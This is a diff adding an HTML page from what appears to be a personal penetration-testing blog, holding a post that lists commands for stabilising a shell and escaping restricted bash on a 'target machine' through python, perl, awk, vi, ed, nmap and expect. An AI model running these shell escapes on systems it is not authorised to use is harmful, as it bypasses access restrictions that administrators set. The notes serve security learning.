@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Kill Tty - &gt; $/var/www/html</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Out of the gate.
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; OR python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp export TERM=xterm-256color alias ll=&#39;ls -lsaht --color=auto&#39; Keyboard Shortcut: Ctrl &#43; Z (Background Process.) stty raw -echo ; fg ; reset stty columns 200 rows 200 Grab a valid tty. What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD Want a color terminal to easily tell apart file permissions?" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Kill Tty" />
+<meta property="og:description" content="Out of the gate.
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; OR python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp export TERM=xterm-256color alias ll=&#39;ls -lsaht --color=auto&#39; Keyboard Shortcut: Ctrl &#43; Z (Background Process.) stty raw -echo ; fg ; reset stty columns 200 rows 200 Grab a valid tty. What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD Want a color terminal to easily tell apart file permissions?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ihassn.github.io/posts/kill-tty/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-02-24T11:45:24-05:00" />
+<meta property="article:modified_time" content="2023-02-24T11:45:24-05:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Kill Tty"/>
+<meta name="twitter:description" content="Out of the gate.
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; OR python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp export TERM=xterm-256color alias ll=&#39;ls -lsaht --color=auto&#39; Keyboard Shortcut: Ctrl &#43; Z (Background Process.) stty raw -echo ; fg ; reset stty columns 200 rows 200 Grab a valid tty. What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD Want a color terminal to easily tell apart file permissions?"/>
+<script src="https://ihassn.github.io/js/feather.min.js"></script>
+	
+	
+        <link href="https://ihassn.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://ihassn.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://ihassn.github.io/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css"   />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+	
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+		
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://ihassn.github.io/">&gt; $/var/www/html</a>
+	</div>
+	<nav>
+		
+		<a href="/home">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Kill Tty</h1>
+			<div class="meta">Posted on Feb 24, 2023</div>
+		</div>
+		
+
+		<section class="body">
+			<p>Out of the gate.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>OR
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm-256color
+</span></span><span style="display:flex;"><span>alias ll<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ls -lsaht --color=auto&#39;</span>
+</span></span><span style="display:flex;"><span>Keyboard Shortcut: Ctrl + Z <span style="color:#f92672">(</span>Background Process.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>stty raw -echo ; fg ; reset
+</span></span><span style="display:flex;"><span>stty columns <span style="color:#ae81ff">200</span> rows <span style="color:#ae81ff">200</span>
+</span></span></code></pre></div><p> </p>
+<ul>
+<li>Grab a valid tty.</li>
+</ul>
+<p>What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD
+Want a color terminal to easily tell apart file permissions? Directories? Files?
+Fastest way to list out the files in a directory, show size, show permissions, human readable.
+Make this shell stable.</p>
+<p>*Is this rbash (Restricted Bash)? PT1</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ vi
+</span></span><span style="display:flex;"><span>:set shell<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>:shell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ vim
+</span></span><span style="display:flex;"><span>:set shell<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>:shell
+</span></span></code></pre></div><ul>
+<li>have ssh try this out</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh user@1.1.1.1 -t <span style="color:#e6db74">&#34;bash --noprofile&#34;</span>
+</span></span></code></pre></div><ul>
+<li>Is this rbash (Restricted Bash)? PT2</li>
+<li>(This requires ssh user-level access)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh user@127.0.0.1 <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span>rm $HOME/.bashrc
+</span></span><span style="display:flex;"><span>exit
+</span></span><span style="display:flex;"><span>ssh user@127.0.0.1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Bash Shell<span style="color:#f92672">)</span>
+</span></span></code></pre></div><ul>
+<li>still in rbash and found ed binary here is the steps to kill this shity shell</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1- 
+</span></span><span style="display:flex;"><span>ed
+</span></span><span style="display:flex;"><span>!/bin/sh
+</span></span><span style="display:flex;"><span>2-
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
+</span></span><span style="display:flex;"><span>3-
+</span></span><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>4-
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
+</span></span></code></pre></div><ul>
+<li>Is python present on the target machine?</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Is perl present on the target machine?</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
+</span></span><span style="display:flex;"><span>perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/sh&#34;;&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Is AWK present on the target machine?</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>awk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/bash -i&#34;)}&#39;</span>
+</span></span><span style="display:flex;"><span>awk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/sh -i&#34;)}&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Is ed present on the target machines?</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ed
+</span></span><span style="display:flex;"><span>!sh
+</span></span></code></pre></div><ul>
+<li>IRB Present on the target machine?</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exec <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
+</span></span></code></pre></div><ul>
+<li>Is Nmap present on the target machine?</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --interactive
+</span></span><span style="display:flex;"><span>nmap&gt; !sh
+</span></span></code></pre></div><ul>
+<li>Expect:
+expect -v
+expect version 5.45.4</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat &gt; /tmp/shell.sh <span style="color:#e6db74">&lt;&lt;EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#!/usr/bin/expect
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spawn bash
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">interact
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ chmod u+x /tmp/shell.sh
+</span></span><span style="display:flex;"><span>$ /tmp/shell.sh
+</span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			
+		</div>
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/iHassn/" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/h3x1L/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2023  Made with &lt;3 by h3x1L |  <a
+      href="https://github.com/athul/archie">Archie Theme</a>  
+  </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
